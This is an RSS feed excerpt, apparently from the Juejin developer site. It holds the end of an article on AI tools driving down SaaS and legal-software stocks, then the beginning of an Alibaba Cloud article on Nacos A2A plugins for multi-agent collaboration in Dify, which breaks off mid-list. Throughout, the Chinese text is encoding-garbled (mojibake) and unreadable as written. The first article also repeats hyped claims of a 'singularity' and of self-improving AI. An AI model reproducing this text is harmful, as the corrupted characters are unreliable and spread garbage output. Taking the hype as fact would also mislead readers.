<p>è¿™äº›å¹³å°æ‰¿è½½ç€å‘å·¥èµ„ã€IT ç®¡ç†ç­‰æ ¸å¿ƒä¸šåŠ¡ï¼Œéœ€è¦ææ·±çš„è¡Œä¸šçŸ¥è¯†ï¼Œç»éæ•²å‡ è¡Œä»£ç é‚£ä¹ˆç®€å•ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99a6b3e7991340afa0378f6718b67d7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=MspqIRjLbIZhZYmS2YyAR%2BlnO%2Bw%3D" alt="" loading="lazy"/></p>
<p>å½“ç„¶ï¼Œä¸€äº›ç½‘å‹åŒæ ·è®¤ä¸ºï¼ŒSaaS æ¶ˆäº¡ç¡®å®è¢«è¿‡åˆ†å¤¸å¤§äº†ã€‚</p>
<p>å‰æ¯”å°” Â· ç›–èŒ¨çš„æŠ€æœ¯åŠ©ç†ã€Office å›¢é˜Ÿæˆå‘˜åŠè´Ÿè´£äºº Steven Sinofsky ç›´è¨€ï¼š</p>
<p>è½¯ä»¶å·²æ­»ã€‚è½¯ä»¶çº¯æ¸¸æˆçš„æ¦‚å¿µå°†æ¶ˆå¤±åœ¨æŸä¸ªè¯­è¨€æ¨¡å‹ä¸­ã€‚</p>
<p>èƒ¡è¯´å…«é“ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74614dcb4348449fb484d60f94f955d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=7mByfuxHXFanrz9gNa9S1Yhm7A0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/faa5f1bc4ed44a1c81baa4b2d99c49c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=Lb8aNcjpm6%2B9mQjt%2BcxKhe51L5o%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œå¥‡ç‚¹å·²è‡³ï¼Œäººç±»å¼€å§‹äº¤æ¥æƒåˆ©ã€</strong></p>
<p>å†å²ä¸Šï¼Œå¸‚åœºå¯¹è½¯ä»¶è¡Œä¸šçš„æ‚²è§‚æƒ…ç»ªä¸æ˜¯æ²¡å‡ºç°è¿‡ã€‚</p>
<p>å½“å¹´ã€Œç§»åŠ¨äº’è”ç½‘ã€ç«èµ·æ¥æ—¶ï¼Œæ›¾æœ‰ä¸€å †äººé¢„æµ‹å¾®è½¯ä¼šå®Œè›‹â€”â€”è°è¿˜åœ¨ç”¨ PCï¼Œå¤§å®¶éƒ½å»åˆ·æ‰‹æœºäº†ã€‚</p>
<p>ä½†è¿‡å»åå¹´ï¼Œå¾®è½¯è‚¡ä»·æ¶¨äº†è¿‘ 800%ã€‚</p>
<p>å½­åšåˆ†æå¸ˆ Rana ä¹Ÿè¯´ï¼šã€Œè¿™åœ¨è½¯ä»¶è¡Œä¸šå…¶å®æŒºå¸¸è§çš„ã€‚çœŸå‡ºäº‹çš„æ—¶å€™ï¼Œå¾ˆå¤šå…¬å¸ä¹Ÿæ— èƒ½ä¸ºåŠ›ã€‚ã€</p>
<p>ä½†è¿™ä¸æ˜¯ä¸€æ¬¡ç®€å•çš„è‚¡ç¾ï¼Œè¿™æ˜¯**ã€Œäººç±»ç»æµå²ä¸Šæœ€å¤§çš„ä»·å€¼è½¬ç§»â€”â€”ä»ã€Œç¢³åŸºå¤§è„‘ã€å‘ã€Œç¡…åŸºæ™ºèƒ½ã€çš„æš´åŠ›äº¤æ¥ã€‚ã€**</p>
<p>è°·æ­Œ Genie å…¬å¼€å‘å¸ƒä¸€å‘¨å†…æ¸¸æˆè‚¡æš´è·Œ 15%ï¼›</p>
<p>è§†é¢‘æ¨¡å‹å¦‚ Veo3ã€Higgsfield å–ä»£äººç±»åˆ›ä½œè€…ï¼Œè¿«ä½¿ SAG å·¥ä¼šä¸º AI å½±å“è€…å¾ç¨æåŠ©äººç±»æ¼”å‘˜åŸºé‡‘ï¼›</p>
<p>è´¢å¯Œ 500 å¼ºä¼ä¸šå–æ¶ˆæ•°ç™¾ä¸‡ç¾å…ƒè½¯ä»¶åˆåŒï¼Œè½¬ç”¨ AI æ™ºèƒ½ä½“å¹³å°ï¼›</p>
<p>OpenAI å’Œ Anthropic ä¸ç§‘ç ”æœºæ„åˆä½œï¼Œæ¨å‡ºå¥åº·åŠŸèƒ½è‡ªåŠ¨åŒ–åŒ»ç–—ã€åˆ¶è¯ã€ç ”ç©¶ç­‰ä¸‡äº¿å¸‚åœºï¼›</p>
<p>GPT-5.2 å’Œ Gemini è§£å†³æ•°å­¦éš¾é¢˜ï¼Œè´¨ç–‘æ•°å­¦å­¦ä½ä»·å€¼ã€‚</p>
<p>è°è¿˜èƒ½å¦è®¤ AI æ²¡æœ‰ç»æµæ•ˆç›Šï¼Ÿè°èƒ½æƒ³åˆ° AI ä¼šè¿™ä¹ˆå¿«å°±å¹²æ‰æ•´ä¸ªè¡Œä¸šï¼Ÿ</p>
<p>ä½†è¿™ç”šè‡³è¿˜ä¸æ˜¯æœ€ç–¯ç‹‚çš„éƒ¨åˆ†ã€‚</p>
<p>ä½†è¿™è¿˜ä¸æ˜¯æœ€ç–¯ç‹‚çš„ï¼ŒOpenAI Codex è´Ÿè´£äººç›´è¨€ï¼šã€ŒCodex ç°åœ¨èƒ½è‡ªæˆ‘æ„å»ºï¼Œæˆ‘ä»¬åªéœ€ç›‘ç£ã€‚ã€</p>
<p>Anthropic å›¢é˜Ÿä¹Ÿå¯¹ Claude è¡¨è¾¾äº†ç›¸åŒè§‚ç‚¹ï¼šå®ƒèƒ½è‡ªæˆ‘æ”¹è¿›ã€‚</p>
<p>æˆ‘ä»¬å·²è¿›å…¥ AI ä¸ä»…é¢ è¦†äººç±»è¡Œä¸šã€ç”šè‡³å¼€å§‹è‡ªåŠ¨åŒ–è‡ªèº«è¿­ä»£çš„é˜¶æ®µã€‚</p>
<p>æˆ‘ä»¬å·²ç»è·¨è¿‡äº†é‚£é“éšå½¢çš„é—¨æ§›â€”â€”AI ä¸å†åªæ˜¯é¢ è¦†äººç±»çš„è¡Œä¸šï¼Œå®ƒå¼€å§‹è‡ªåŠ¨åŒ–è‡ªèº«çš„è¿­ä»£ã€‚</p>
<p>äººç±»ä¸äººå·¥è®¤çŸ¥çš„åŠ é€Ÿèåˆï¼Œæœ€ç»ˆå°†å½’ç»“ä¸ºä¸€ä¸ªå†·é…·çš„æ–¹ç¨‹å¼ï¼šç®—åŠ› Ã— èƒ½æº Ã— ç¡…ç‰‡ã€‚</p>
<p>åœ¨æœªæ¥çš„å†å²ä¹¦ä¸­ï¼Œè¿™å¯èƒ½åªæ˜¯çŸ­çŸ­çš„ä¸€è¡Œå­—ï¼šã€ŒAnthropic å‘å¸ƒ Claude Cowork ä¸ Claude Codeï¼Œæ ‡å¿—ç€è„‘åŠ›åŠ³åŠ¨è‡ªåŠ¨åŒ–çš„å¥‡ç‚¹æ¥ä¸´ã€‚ã€</p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.ft.com%2Fcontent%2F48ec5657-c2e7-4111-a236-24a96a8d49e7" target="_blank" title="https://www.ft.com/content/48ec5657-c2e7-4111-a236-24a96a8d49e7" ref="nofollow noopener noreferrer">www.ft.com/content/48eâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bloomberg.com%2Fnews%2Farticles%2F2026-02-03%2Flegal-software-stocks-plunge-as-anthropic-releases-new-ai-tool" target="_blank" title="https://www.bloomberg.com/news/articles/2026-02-03/legal-software-stocks-plunge-as-anthropic-releases-new-ai-tool" ref="nofollow noopener noreferrer">www.bloomberg.com/news/articlâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.theguardian.com%2Ftechnology%2F2026%2Ffeb%2F03%2Fanthropic-ai-legal-tool-shares-data-services-pearson" target="_blank" title="https://www.theguardian.com/technology/2026/feb/03/anthropic-ai-legal-tool-shares-data-services-pearson" ref="nofollow noopener noreferrer">www.theguardian.com/technology/â€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.businessinsider.com%2Fanthropic-cowork-legal-plugin-publishing-stocks-legalzoom-thomson-reuters-relx-2026-2" target="_blank" title="https://www.businessinsider.com/anthropic-cowork-legal-plugin-publishing-stocks-legalzoom-thomson-reuters-relx-2026-2" ref="nofollow noopener noreferrer">www.businessinsider.com/anthropic-câ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Dify å®˜æ–¹ä¸Šæ¶ Nacos A2A æ’ä»¶ï¼Œè¡¥å…¨åŒå‘å¤šæ™ºèƒ½ä½“åä½œèƒ½åŠ›]]></title>    <link>https://juejin.cn/post/7603219519666257939</link>    <guid>https://juejin.cn/post/7603219519666257939</guid>    <pubDate>2026-02-05T10:15:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519666257939" data-draft-id="7603010441149595689" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Dify å®˜æ–¹ä¸Šæ¶ Nacos A2A æ’ä»¶ï¼Œè¡¥å…¨åŒå‘å¤šæ™ºèƒ½ä½“åä½œèƒ½åŠ›"/> <meta itemprop="keywords" content="äº‘åŸç”Ÿ"/> <meta itemprop="datePublished" content="2026-02-05T10:15:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘äº‘åŸç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Dify å®˜æ–¹ä¸Šæ¶ Nacos A2A æ’ä»¶ï¼Œè¡¥å…¨åŒå‘å¤šæ™ºèƒ½ä½“åä½œèƒ½åŠ›
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘äº‘åŸç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:15:47.000Z" title="Thu Feb 05 2026 10:15:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šæ¿¯å…‰</p>
<h2 data-id="heading-0">èƒŒæ™¯ä¸æŒ‘æˆ˜ï¼šå¤šæ™ºèƒ½ä½“åä½œä¸­çš„å…¸å‹é—®é¢˜</h2>
<p>éšç€ AI Agent æŠ€æœ¯çš„å¿«é€Ÿå‘å±•ï¼Œå•ä¸€æ™ºèƒ½ä½“å·²ç»éš¾ä»¥æ»¡è¶³å¤æ‚ä¸šåŠ¡åœºæ™¯çš„éœ€æ±‚ã€‚å¤šæ™ºèƒ½ä½“åä½œï¼ˆMulti-Agent Collaborationï¼‰æ­£åœ¨æˆä¸º AI åº”ç”¨çš„ä¸»æµè¶‹åŠ¿â€”â€”è®©å¤šä¸ªå…·å¤‡ä¸åŒä¸“é•¿çš„æ™ºèƒ½ä½“ååŒå·¥ä½œï¼Œå…±åŒå®Œæˆå¤æ‚ä»»åŠ¡ã€‚</p>
<p>Google äº 2025 å¹´åˆå‘å¸ƒçš„ A2Aï¼ˆAgent-to-Agentï¼‰åè®®ï¼Œä¸ºå¤šæ™ºèƒ½ä½“é—´çš„æ ‡å‡†åŒ–é€šä¿¡æä¾›äº†é‡è¦åŸºç¡€ã€‚A2A åè®®å®šä¹‰äº†æ™ºèƒ½ä½“ä¹‹é—´çš„å‘ç°ã€èƒ½åŠ›æè¿°å’Œä»»åŠ¡äº¤äº’æ ‡å‡†ï¼Œä½¿å¾—ä¸åŒæ¥æºã€ä¸åŒæ¡†æ¶çš„æ™ºèƒ½ä½“èƒ½å¤Ÿæ— ç¼åä½œã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/428a7dc0071243a6aa5bb2086a3aac0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=JpRk7MpIGIaJbHbX%2BTZWrnHlMB8%3D" alt="Gemini_Generated_Image_m28lnfm28lnfm28l.png" loading="lazy"/></p>
<p>ç„¶è€Œï¼Œ<strong>Dify å¹³å°ç›®å‰åŸç”Ÿå¹¶ä¸æ”¯æŒ A2A åè®®</strong>ã€‚è¿™æ„å‘³ç€å¼€å‘è€…æ— æ³•ç›´æ¥åœ¨ Dify ä¸­å‘ç°å’Œè°ƒç”¨éµå¾ª A2A æ ‡å‡†çš„æ™ºèƒ½ä½“ï¼Œç¼ºä¹ä¸ A2A ç”Ÿæ€è¿›è¡Œé›†æˆçš„æœ‰æ•ˆé€”å¾„ã€‚å…·ä½“æ¥è¯´ï¼ŒDify å¼€å‘è€…é¢ä¸´ä»¥ä¸‹æŒ‘æˆ˜ï¼š</p>
<ul>
<li><strong>åè®®ä¸å…¼å®¹ï¼š</strong> Dify åŸç”Ÿä¸æ”¯æŒ A2A åè®®ï¼Œæ— æ³•ç›´æ¥è§£æ AgentCardã€å¤„ç† A2A æ¶ˆæ¯æ ¼å¼ï¼Œä¸å·²æœ‰çš„ A2A Agent ç”Ÿæ€å®Œå…¨éš”ç¦»ã€‚</li>
<li><strong>æ™ºèƒ½ä½“å‘ç°å›°éš¾ï¼š</strong> å¤šä¸ª A2A Agent åˆ†æ•£éƒ¨ç½²åœ¨ä¸åŒç¯å¢ƒä¸­ï¼Œæ²¡æœ‰æ ‡å‡†æ–¹å¼è®© Dify åº”ç”¨å‘ç°å’Œç®¡ç†è¿™äº›æ™ºèƒ½ä½“ï¼Œæ¯æ¬¡æ¥å…¥éƒ½éœ€è¦å¤§é‡å®šåˆ¶å¼€å‘ã€‚</li>
<li><strong>åŠ¨æ€é€‰æ‹©å—é™ï¼š</strong> ä¼ ç»Ÿæ–¹å¼ä¸‹ï¼ŒDify åº”ç”¨åªèƒ½è°ƒç”¨é¢„å…ˆç¡¬ç¼–ç çš„å•ä¸€æ™ºèƒ½ä½“ï¼Œæ— æ³•æ ¹æ®å®é™…ä»»åŠ¡éœ€æ±‚åŠ¨æ€é€‰æ‹©æœ€åˆé€‚çš„æ™ºèƒ½ä½“ã€‚</li>
<li><strong>åä½œç¼–æ’å¤æ‚ï¼š</strong> å½“ä¸šåŠ¡éœ€è¦å¤šä¸ªæ™ºèƒ½ä½“åä½œæ—¶ï¼Œå¼€å‘è€…éœ€è¦åœ¨å·¥ä½œæµä¸­è¿›è¡Œå¤§é‡çš„æ¡ä»¶åˆ¤æ–­å’Œè·¯ç”±é€»è¾‘ï¼Œå¼€å‘å’Œç»´æŠ¤æˆæœ¬é«˜ã€‚</li>
<li><strong>ç¼ºä¹ç»Ÿä¸€æ³¨å†Œä¸­å¿ƒï¼š</strong> æ²¡æœ‰é›†ä¸­ç®¡ç† A2A Agent çš„å¹³å°ï¼Œéš¾ä»¥å¯¹æ™ºèƒ½ä½“è¿›è¡Œç»Ÿä¸€çš„æ³¨å†Œã€å‘ç°å’Œæ²»ç†ã€‚</li>
<li><strong>æ— æ³•å¯¹å¤–æš´éœ²ï¼š</strong> Dify æ„å»ºçš„æ™ºèƒ½ä½“åº”ç”¨åªèƒ½åœ¨ Dify å¹³å°å†…ä½¿ç”¨ï¼Œæ— æ³•ä»¥æ ‡å‡†åè®®å¯¹å¤–æä¾›æœåŠ¡ï¼Œéš¾ä»¥è¢«å…¶ä»– A2A ç”Ÿæ€ä¸­çš„æ™ºèƒ½ä½“å‘ç°å’Œè°ƒç”¨ã€‚</li>
</ul>
<p>è¿™äº›é—®é¢˜å¯¼è‡´ Dify å¼€å‘è€…åœ¨æ„å»ºå¤šæ™ºèƒ½ä½“åº”ç”¨æ—¶ï¼Œé¢ä¸´<strong>åè®®ä¸é€šã€æ¥å…¥æˆæœ¬é«˜ã€æ‰©å±•æ€§å·®ã€çµæ´»åº¦ä½ã€æ— æ³•å¯¹å¤–äº’é€š</strong>çš„å›°å¢ƒã€‚</p>
<h2 data-id="heading-1">è§£å†³æ–¹æ¡ˆï¼šNacos Agent Registry + A2A æ’ä»¶ç»„åˆ</h2>
<p>ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼ŒNacos å®˜æ–¹ä¸º Dify å¹³å°æ‰“é€ äº†<strong>åŒå‘ A2A åè®®é›†æˆæ–¹æ¡ˆ</strong>ï¼Œé€šè¿‡ä¸¤ä¸ªäº’è¡¥çš„æ’ä»¶<strong>å¡«è¡¥äº† Dify åœ¨ A2A åè®®æ”¯æŒä¸Šçš„ç©ºç™½</strong>ï¼Œè®© Dify åº”ç”¨æ—¢èƒ½è°ƒç”¨å¤–éƒ¨ A2A æ™ºèƒ½ä½“ï¼Œåˆèƒ½ä½œä¸º A2A æ™ºèƒ½ä½“è¢«å¤–éƒ¨ç³»ç»Ÿè°ƒç”¨ã€‚</p>
<p>Nacos 3.0 åœ¨æ”¯æŒ MCP Registry çš„åŸºç¡€ä¸Šï¼Œè¿›ä¸€æ­¥æ‹“å±•äº†å¯¹ A2A Agent çš„æ”¯æŒèƒ½åŠ›ï¼Œæ¨å‡ºäº†Â <strong>Nacos Agent Registry</strong>â€”â€”ä¸€ä¸ªç»Ÿä¸€çš„ AI æ™ºèƒ½ä½“æ³¨å†Œä¸å‘ç°å¹³å°ã€‚ç»“åˆ A2A æ’ä»¶ç»„åˆï¼ŒDify å¼€å‘è€…å¯ä»¥ï¼š</p>
<h4 data-id="heading-2">A2A Discovery æ’ä»¶ï¼ˆè°ƒç”¨å¤–éƒ¨æ™ºèƒ½ä½“ï¼‰</h4>
<ul>
<li><strong>æ‰“é€š A2A åè®®ï¼š</strong> æ’ä»¶å†…ç½®å®Œæ•´çš„ A2A åè®®æ”¯æŒï¼Œè‡ªåŠ¨è§£æ AgentCardã€å¤„ç†æ ‡å‡†æ¶ˆæ¯æ ¼å¼ï¼Œè®© Dify ä¸ A2A ç”Ÿæ€æ— ç¼å¯¹æ¥ã€‚</li>
<li><strong>ç»Ÿä¸€æ™ºèƒ½ä½“å‘ç°ï¼š</strong> è‡ªåŠ¨ä» Nacos Agent Registry å‘ç°æ‰€æœ‰å·²æ³¨å†Œçš„ A2A Agentï¼Œæ— éœ€æ‰‹åŠ¨é…ç½®æ¯ä¸ªæ™ºèƒ½ä½“çš„è¿æ¥ä¿¡æ¯ã€‚</li>
<li><strong>åŠ¨æ€æ™ºèƒ½ä½“é€‰æ‹©ï¼š</strong> LLM å¯ä»¥æ ¹æ®ä»»åŠ¡éœ€æ±‚ï¼Œä»å¤šä¸ªå¯ç”¨æ™ºèƒ½ä½“ä¸­æ™ºèƒ½é€‰æ‹©æœ€åˆé€‚çš„ä¸€ä¸ªè¿›è¡Œè°ƒç”¨ã€‚</li>
<li><strong>çµæ´»çš„å‘ç°æ¨¡å¼ï¼š</strong> æ”¯æŒ Nacos æ¨¡å¼å’Œ URL æ¨¡å¼ä¸¤ç§å‘ç°æ–¹å¼ï¼Œæ»¡è¶³ä¸åŒéƒ¨ç½²åœºæ™¯çš„éœ€æ±‚ã€‚</li>
</ul>
<h4 data-id="heading-3">A2A Server æ’ä»¶ï¼ˆæš´éœ² Dify åº”ç”¨ï¼‰</h4>
<ul>
<li><strong>æ ‡å‡†åè®®æš´éœ²ï¼š</strong> å°† Dify ä¸­çš„ä»»æ„åº”ç”¨ï¼ˆChatbot/Agent/Chatflow/Workflowï¼‰æš´éœ²ä¸ºç¬¦åˆ A2A åè®®æ ‡å‡†çš„æ™ºèƒ½ä½“ã€‚</li>
<li><strong>è‡ªåŠ¨æ³¨å†Œå‘ç°ï¼š</strong> æ”¯æŒå°† Dify åº”ç”¨è‡ªåŠ¨æ³¨å†Œåˆ° Nacos Agent Registryï¼Œè®©å…¶ä»–æ™ºèƒ½ä½“èƒ½å¤Ÿå‘ç°å’Œè°ƒç”¨ã€‚</li>
<li><strong>å¤šè½®å¯¹è¯æ”¯æŒï¼š</strong> åŸºäº Dify Plugin Storage ç»´æŠ¤ä¼šè¯ä¸Šä¸‹æ–‡ï¼Œæ”¯æŒè·¨è¯·æ±‚çš„è¿ç»­å¯¹è¯ã€‚</li>
<li><strong>æ ‡å‡†ç«¯ç‚¹ï¼š</strong> æä¾›æ ‡å‡†çš„ /.well-known/agent.jsonÂ ç«¯ç‚¹ç”¨äºæ™ºèƒ½ä½“å…ƒæ•°æ®å‘ç°ã€‚</li>
</ul>
<p>ç›®å‰ï¼ŒNacos å®˜æ–¹ A2A æ’ä»¶å·²æ­£å¼ä¸Šæ¶ Dify å®˜æ–¹æ’ä»¶å¸‚åœºï¼š</p>
<ul>
<li>
<p>A2A Discovery æ’ä»¶ï¼ˆA2A Agent Clientï¼‰ï¼š
<a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.dify.ai%2Fplugins%2Fnacos%2Fa2a_discovery%3Flanguage%3Dzh-Hans" target="_blank" title="https://marketplace.dify.ai/plugins/nacos/a2a_discovery?language=zh-Hans" ref="nofollow noopener noreferrer">marketplace.dify.ai/plugins/nacâ€¦</a></p>
</li>
<li>
<p>A2A Server æ’ä»¶ï¼š
<a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.dify.ai%2Fplugins%2Fnacos%2Fa2a_server%3Flanguage%3Dzh-Hans" target="_blank" title="https://marketplace.dify.ai/plugins/nacos/a2a_server?language=zh-Hans" ref="nofollow noopener noreferrer">marketplace.dify.ai/plugins/nacâ€¦</a></p>
</li>
</ul>
<h3 data-id="heading-4">æ•´ä½“æ¶æ„</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/370e55e9979a45f4b8108f6e2e3b142f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=YY8%2BHjWYk2m%2B9jYgPyXIZVL2dbc%3D" alt="image_1769060277140.png" loading="lazy"/></p>
<h2 data-id="heading-5">æ ¸å¿ƒåŠŸèƒ½è¯¦è§£</h2>
<h3 data-id="heading-6">3.1 A2A Discovery æ’ä»¶ï¼šè°ƒç”¨å¤–éƒ¨æ™ºèƒ½ä½“</h3>
<h4 data-id="heading-7">3.1.1 ä¸¤ç§æ™ºèƒ½ä½“å‘ç°æ¨¡å¼</h4>
<p><strong>Nacos æ¨¡å¼ï¼ˆæ¨èï¼‰</strong></p>
<p>é€šè¿‡ Nacos Agent Registry ç»Ÿä¸€ç®¡ç†å’Œå‘ç°æ™ºèƒ½ä½“ã€‚åªéœ€åœ¨ Nacos ä¸­æ³¨å†Œ A2A Agentï¼ŒDify åº”ç”¨å³å¯è‡ªåŠ¨å‘ç°å¹¶è°ƒç”¨ã€‚</p>
<p>ä¼˜åŠ¿ï¼š</p>
<ul>
